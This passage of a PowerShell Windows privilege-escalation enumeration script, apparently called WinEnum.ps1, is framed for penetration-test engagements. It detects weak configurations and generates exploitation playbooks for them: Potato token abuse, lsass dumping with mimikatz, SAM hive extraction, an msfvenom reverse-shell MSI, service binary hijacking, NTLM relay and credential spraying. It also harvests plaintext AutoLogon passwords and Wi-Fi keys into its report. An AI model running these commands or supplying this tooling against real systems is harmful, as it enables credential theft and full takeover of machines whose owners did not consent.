    $dsreg = "$env:SystemRoot\System32\dsregcmd.exe"
    if (Test-Path $dsreg) { & $dsreg /status }
    else { "dsregcmd not available" }
}

# ---------------------------------------------------------------------------
Section "14. Findings & Exploitation Playbook"

Write-Rpt ""
Write-Rpt "_Derived automatically from the checks above. Verify each item manually; adapt paths and credentials to the engagement._"

# ---- Token privileges -----------------------------------------------------
$privText = (whoami /priv 2>&1 | Out-String)
$enabledPrivs = @()
foreach ($line in ($privText -split "`r?`n")) {
    if ($line -match '^\s*(Se\w+Privilege)\b') {
        $pname = $Matches[1]
        if ($line -match '\bEnabled\b') { $enabledPrivs += $pname }
    }
}

if ($enabledPrivs -contains 'SeImpersonatePrivilege' -or $enabledPrivs -contains 'SeAssignPrimaryTokenPrivilege') {
    Add-Finding -Severity 'HIGH' -Title 'Token impersonation privilege enabled' `
        -Evidence ("Enabled privileges: " + (($enabledPrivs | Sort-Object) -join ', ')) `
        -Note 'Most useful when the shell runs as a service account (IIS, MSSQL).' `
        -Commands @(
            '# Potato family (pick the build that matches this OS)',
            'PrintSpoofer64.exe -i -c cmd.exe',
            'GodPotato.exe -cmd "cmd /c whoami"',
            'JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe"',
            '',
            '# Metasploit equivalent',
            'use exploit/windows/local/ms16_075_reflection_juicy'
        )
}

if ($enabledPrivs -contains 'SeDebugPrivilege') {
    Add-Finding -Severity 'HIGH' -Title 'SeDebugPrivilege enabled' -Evidence 'SeDebugPrivilege' `
        -Commands @(
            'procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp',
            '# Off-host:',
            'mimikatz.exe "sekurlsa::minidump C:\Windows\Temp\lsass.dmp" "sekurlsa::logonpasswords" exit'
        )
}

if ($enabledPrivs -contains 'SeBackupPrivilege') {
    Add-Finding -Severity 'HIGH' -Title 'SeBackupPrivilege enabled' -Evidence 'SeBackupPrivilege' `
        -Commands @(
            'robocopy /b C:\Windows\System32\config C:\Windows\Temp SAM SYSTEM SECURITY',
            '# Off-host:',
            'secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL'
        )
}

if ($enabledPrivs -contains 'SeRestorePrivilege') {
    Add-Finding -Severity 'HIGH' -Title 'SeRestorePrivilege enabled' -Evidence 'SeRestorePrivilege' `
        -Commands @(
            '# Overwrite a protected file that a privileged process executes:',
            'copy /y C:\Windows\Temp\payload.exe C:\Windows\System32\<target>.exe'
        )
}

if ($enabledPrivs -contains 'SeTakeOwnershipPrivilege') {
    Add-Finding -Severity 'HIGH' -Title 'SeTakeOwnershipPrivilege enabled' -Evidence 'SeTakeOwnershipPrivilege' `
        -Commands @(
            'takeown /f C:\Windows\System32\config\SAM',
            'icacls C:\Windows\System32\config\SAM /grant "%USERNAME%:F"'
        )
}

if ($enabledPrivs -contains 'SeLoadDriverPrivilege') {
    Add-Finding -Severity 'HIGH' -Title 'SeLoadDriverPrivilege enabled' -Evidence 'SeLoadDriverPrivilege' `
        -Note 'Load a signed-but-vulnerable driver for kernel code execution.' `
        -Commands @('# Tools: EOPLOADDRIVER + ExploitCapcom, or the "vulnerable driver" technique')
}

# ---- Writable service binaries / directories ------------------------------
$writableSvc = @()
foreach ($s in Get-CimInstance Win32_Service) {
    $p = $s.PathName
    if (-not $p) { continue }
    $exe = $null
    if ($p -match '^\s*"([^"]+)"') { $exe = $Matches[1] }
    elseif ($p -match '^\s*([A-Za-z]:\\[^"]*?\.exe)') { $exe = $Matches[1] }
    if (-not $exe) { continue }
    $exe = $exe.Trim()
    if (-not (Test-Path -LiteralPath $exe)) { continue }
    if (Test-WritablePath $exe) {
        $writableSvc += [pscustomobject]@{ Name = $s.Name; Path = $exe; Kind = 'binary' }
    } else {
        $dir = Split-Path -LiteralPath $exe -Parent
        if ($dir -and (Test-WritablePath $dir)) {
            $writableSvc += [pscustomobject]@{ Name = $s.Name; Path = $dir; Kind = 'directory' }
        }
    }
}
if ($writableSvc.Count -gt 0) {
    $ev = (($writableSvc | ForEach-Object { "{0}: {1} -> {2}" -f $_.Kind.ToUpper(), $_.Name, $_.Path }) -join "`n")
    $cmds = @()
    foreach ($w in $writableSvc) {
        if ($w.Kind -eq 'binary') {
            $cmds += '# Replace the service binary directly (keep a backup):'
            $cmds += ('copy "{0}" "{0}.bak"' -f $w.Path)
            $cmds += ('copy /y C:\Windows\Temp\payload.exe "{0}"' -f $w.Path)
            $cmds += ('sc.exe stop "{0}"; sc.exe start "{0}"' -f $w.Name)
            $cmds += ''
        } else {
            $cmds += '# Writable service directory: repoint the service'
            $cmds += ('sc.exe config "{0}" binPath= "C:\Windows\Temp\payload.exe"' -f $w.Name)
            $cmds += ('sc.exe stop "{0}"; sc.exe start "{0}"' -f $w.Name)
            $cmds += ('# DLL hijack is also possible in {0}' -f $w.Path)
            $cmds += ''
        }
    }
    Add-Finding -Severity 'HIGH' -Title 'Writable service binary or directory' -Evidence $ev -Commands $cmds `
        -Note 'Restore the original binPath or backup when finished.'
}

# ---- Unquoted service path hijack -----------------------------------------
$unquoted = @()
foreach ($s in Get-CimInstance Win32_Service) {
    $p = $s.PathName
    if (-not $p -or $p.StartsWith('"') -or $p -notmatch ' ') { continue }
    $exeIdx = $p.ToLower().IndexOf('.exe')
    if ($exeIdx -lt 0) { continue }
    foreach ($m in [regex]::Matches($p, ' ')) {
        if ($m.Index -ge $exeIdx) { continue }
        $cand = $p.Substring(0, $m.Index) + '.exe'
        if (Test-Path -LiteralPath $cand) { continue }
        $dir = Split-Path -LiteralPath $cand -Parent
        if (-not $dir -or -not (Test-Path -LiteralPath $dir)) { continue }
        if (Test-WritablePath $dir) {
            $unquoted += [pscustomobject]@{ Name = $s.Name; Candidate = $cand }
        }
    }
}
if ($unquoted.Count -gt 0) {
    $ev = (($unquoted | ForEach-Object { "{0} -> drop {1}" -f $_.Name, $_.Candidate }) -join "`n")
    $cmds = @('# The service loader tries these paths in order; one is writable.')
    foreach ($u in $unquoted) {
        $cmds += ('copy /y C:\Windows\Temp\payload.exe "{0}"' -f $u.Candidate)
        $cmds += ('sc.exe stop "{0}"; sc.exe start "{0}"' -f $u.Name)
        $cmds += ''
    }
    Add-Finding -Severity 'HIGH' -Title 'Unquoted service path with writable directory' -Evidence $ev -Commands $cmds
}

# ---- AlwaysInstallElevated ------------------------------------------------
$msiHklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$msiHkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ("$msiHklm" -eq '1' -and "$msiHkcu" -eq '1') {
    Add-Finding -Severity 'HIGH' -Title 'AlwaysInstallElevated enabled' -Evidence 'HKLM=1 and HKCU=1' `
        -Commands @(
            'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi',
            'msiexec /quiet /qn /i C:\Windows\Temp\evil.msi'
        )
}

# ---- AutoLogon ------------------------------------------------------------
$wl = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue
if ($wl.DefaultPassword) {
    $target = "$($wl.DefaultDomainName)\$($wl.DefaultUserName)"
    Add-Finding -Severity 'CRITICAL' -Title 'AutoLogon credentials stored in registry' `
        -Evidence ("User: {0}`nPassword: {1}" -f $target, $wl.DefaultPassword) `
        -Commands @(
            ('runas /user:{0} cmd.exe' -f $target),
            ('net use \\{0}\c$ /user:{1} {2}' -f $env:COMPUTERNAME, $wl.DefaultUserName, $wl.DefaultPassword),
            '# Spray this credential against other hosts in scope.'
        )
}

# ---- Credential Manager ---------------------------------------------------
$ck = (cmdkey /list 2>&1 | Out-String)
if ($ck -match 'Target:') {
    $ckEvidence = (($ck -split "`r?`n") | Where-Object { $_ -match 'Target:|User:' } | ForEach-Object { $_.Trim() }) -join "`n"
    Add-Finding -Severity 'HIGH' -Title 'Stored credentials in Windows Credential Manager' -Evidence $ckEvidence `
        -Commands @(
            'cmdkey /list',
            '# Reuse a stored credential without knowing the password:',
            'runas /savecred /user:<account> cmd.exe',
            '# Or extract DPAPI blobs:',
            'mimikatz.exe "dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<file>" exit'
        )
}

# ---- Wireless PSKs --------------------------------------------------------
$wlanProfiles = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object {
    ($_.Line -split ':', 2)[1].Trim()
}
$wlanKeys = @()
foreach ($p in $wlanProfiles) {
    $wout = (netsh wlan show profile name="$p" key=clear) | Out-String
    if ($wout -match 'Key Content\s*:\s*(.+)') {
        $wlanKeys += ('{0} : {1}' -f $p, $Matches[1].Trim())
    }
}
if ($wlanKeys.Count -gt 0) {
    Add-Finding -Severity 'HIGH' -Title 'Wireless PSK recovered in cleartext' -Evidence ($wlanKeys -join "`n") `
        -Commands @('# Reuse the PSK against access points/networks in scope','netsh wlan show profile name="<profile>" key=clear')
}

# ---- Defender -------------------------------------------------------------
$mp = Get-MpPreference -ErrorAction SilentlyContinue
if ($mp) {
    $rawExcl = @()
    $rawExcl += @($mp.ExclusionPath)
    $rawExcl += @($mp.ExclusionExtension)
    $rawExcl += @($mp.ExclusionProcess)
    $excl = @($rawExcl | Where-Object { $_ })
    if ($excl.Count -gt 0) {
        Add-Finding -Severity 'MEDIUM' -Title 'Defender exclusions configured' -Evidence ($excl -join "`n") `
            -Commands @('# Stage tooling inside an excluded path','copy payload.exe "C:\Excluded\Path\payload.exe"')
    }
    if ($mp.DisableRealtimeMonitoring -eq $true) {
        Add-Finding -Severity 'HIGH' -Title 'Defender real-time monitoring disabled' -Evidence 'DisableRealtimeMonitoring = True' `
            -Commands @('# No AV interference expected on this host.')
    }
}

# ---- UAC / token filter ---------------------------------------------------
$uac = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction SilentlyContinue
if ($uac.EnableLUA -eq 0) {
    Add-Finding -Severity 'HIGH' -Title 'UAC disabled' -Evidence 'EnableLUA = 0' `
        -Commands @('# Any process started by a member of Administrators runs with a full token.')
}
if ($uac.LocalAccountTokenFilterPolicy -eq 1) {
    Add-Finding -Severity 'MEDIUM' -Title 'LocalAccountTokenFilterPolicy enabled' -Evidence 'LocalAccountTokenFilterPolicy = 1' `
        -Commands @(
            '# Remote logons by local admins receive a full token:',
            'PsExec64.exe \\HOST -u HOST\localadmin -p <password> cmd.exe',
            'net use \\HOST\c$ /user:HOST\localadmin <password>'
        )
}

# ---- SMB ------------------------------------------------------------------
$smb = Get-SmbServerConfiguration -ErrorAction SilentlyContinue
if ($smb) {
    if ($smb.RequireSecuritySignature -eq $false) {
        Add-Finding -Severity 'MEDIUM' -Title 'SMB signing not required' -Evidence 'RequireSecuritySignature = False' `
            -Commands @('# NTLM relay is viable:','ntlmrelayx.py -tf targets.txt -smb2support','Responder.py -I eth0 -rdw')
    }
    if ($smb.EnableSMB1Protocol -eq $true) {
        Add-Finding -Severity 'MEDIUM' -Title 'SMBv1 enabled' -Evidence 'EnableSMB1Protocol = True' `
            -Commands @('# SMBv1 enables downgrade attacks; prefer SMB2 tooling first.')
    }
}

# ---- Privileged scheduled tasks ------------------------------------------
$taskHits = @()
foreach ($t in Get-ScheduledTask -ErrorAction SilentlyContinue) {
    $principal = "$($t.Principal.UserId)"
    if ($principal -notmatch 'SYSTEM|S-1-5-18|Administrators|S-1-5-32-544') { continue }
    foreach ($a in $t.Actions) {
        $exe = "$($a.Execute)".Trim('"')
        if (-not $exe) { continue }
        $exe = [Environment]::ExpandEnvironmentVariables($exe)
        if (-not (Test-Path -LiteralPath $exe)) { continue }
        if (Test-WritablePath $exe) {
            $taskHits += ('BINARY : {0}{1} -> {2}' -f $t.TaskPath, $t.TaskName, $exe)
        } else {
            $d = Split-Path -LiteralPath $exe -Parent
            if ($d -and (Test-WritablePath $d)) {
                $taskHits += ('DIR    : {0}{1} -> {2}' -f $t.TaskPath, $t.TaskName, $d)
            }
        }
    }
}
if ($taskHits.Count -gt 0) {
    Add-Finding -Severity 'HIGH' -Title 'Privileged scheduled task with writable action' -Evidence ($taskHits -join "`n") `
        -Commands @('# Replace the action binary or drop a hijacked DLL, then trigger the task','schtasks /run /tn "<task>"')
}

# ---- Domain (server-local only) ------------------------------------------
# The domain itself is out of scope: surface only this host's local domain
# artifacts (cached tickets, logons, applied GPO). No domain-wide queries.
if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain) {
    Add-Finding -Severity 'INFO' -Title 'Domain-joined host (stay host-local)' -Evidence ("Domain: $env:USERDNSDOMAIN") `
        -Commands @(
            '# Domain is out of scope - keep everything to this box:',
            '# Dump tickets / credentials already cached on this host:',
            'Rubeus.exe dump',
            'mimikatz.exe "sekurlsa::tickets" "sekurlsa::logonpasswords" exit',
            '# Review applied GPO (gpresult /r) and cached domain logons (query user).'
        )
}

# ---- Cloud credentials ----------------------------------------------------
$cloud = @()
foreach ($f in @(
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.aws\config",
    "$env:USERPROFILE\.azure\azureProfile.json",
    "$env:APPDATA\gcloud\credentials.db",
    "$env:USERPROFILE\.docker\config.json"
)) { if (Test-Path $f) { $cloud += $f } }
if ($cloud.Count -gt 0) {
    Add-Finding -Severity 'HIGH' -Title 'Cloud CLI credentials on disk' -Evidence ($cloud -join "`n") `
        -Commands @(
            'aws sts get-caller-identity',
            'aws s3 ls',
            'gcloud auth list',
            '# Instance metadata, if this is a cloud VM:',
            'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        )
}

# ---- PATH ----------------------------------------------------------------
# Only the machine PATH matters for escalation: a directory writable by
# standard users lets them hijack tools run by services or administrators.
$pathW = @()
$machinePath = [Environment]::GetEnvironmentVariable('Path', 'Machine')
foreach ($d in ($machinePath -split ';')) {
    if ($d -and (Test-Path -LiteralPath $d) -and (Test-WritablePath $d)) { $pathW += $d }
}
if ($pathW.Count -gt 0) {
    Add-Finding -Severity 'MEDIUM' -Title 'User-writable directory in machine PATH' -Evidence ($pathW -join "`n") `
        -Commands @('# Drop a malicious executable named like a tool a service or administrator runs without a full path.')
}

Write-Findings

# ---------------------------------------------------------------------------
Section "15. Wrap-up / Next Steps"

Write-Rpt ""
Write-Rpt "_The findings above are generated automatically; this checklist covers what to review manually._"
Write-Rpt ""
Write-Rpt "- Review **token privileges** (`SeImpersonate`, `SeDebug`, `SeTcb`, `SeBackup`, `SeRestore`, `SeTakeOwnership`) for known priv-esc paths."
Write-Rpt "- Review **unquoted service paths** and the **writable service binary/dir** findings above."
Write-Rpt "- Check **AlwaysInstallElevated**, **AutoLogon**, **stored credentials**, **unattended files**, **wireless keys** and **browser stores**."
Write-Rpt "- Review **Defender exclusions**, **AppLocker** and **Device Guard** before attempting execution."
Write-Rpt "- Cross-reference **missing patches** with an exploit suggester (Watson / Windows-Exploit-Suggester)."
Write-Rpt "- Review **UAC settings**, **accessibility binaries** and **AppInit/IFEO** entries for hijack paths."
Write-Rpt "- If domain-joined, review this host's **local Kerberos tickets**, **applied GPO** and **cached domain logons** (domain-wide checks are out of scope)."
Write-Rpt "- Use **SMB shares/sessions**, **RDP/WinRM config** and **logged-on sessions** to plan lateral movement."
Write-Rpt "- Escalate through **privileged scheduled tasks**, **service binaries** and **DLL hijacks** identified above."
Write-Rpt "- Keep an eye on **Event ID 4688 / 4104** visibility before running noisy tooling."
Write-Rpt ""
Write-Rpt "### Reference tooling"
Write-Rpt ""
Write-Rpt "- GTFOBins (Unix), LOLBAS (Windows), PayloadsAllTheThings, HackTricks"
Write-Rpt "- winPEAS, Seatbelt, SharpUp for a second opinion"
Write-Rpt "- Rubeus for local ticket extraction (BloodHound/SharpHound only if the domain is later brought into scope)"

Write-Rpt ""
Write-Rpt "---"
Write-Rpt "_Report generated by WinEnum.ps1_"

# ---------------------------------------------------------------------------
$reportPath = Join-Path (Get-Location) $OutFile
$utf8NoBom = New-Object System.Text.UTF8Encoding($false)
[System.IO.File]::WriteAllText($reportPath, $sb.ToString(), $utf8NoBom)

Write-Host ""
Write-Host "[+] Report written to: $reportPath" -ForegroundColor Green
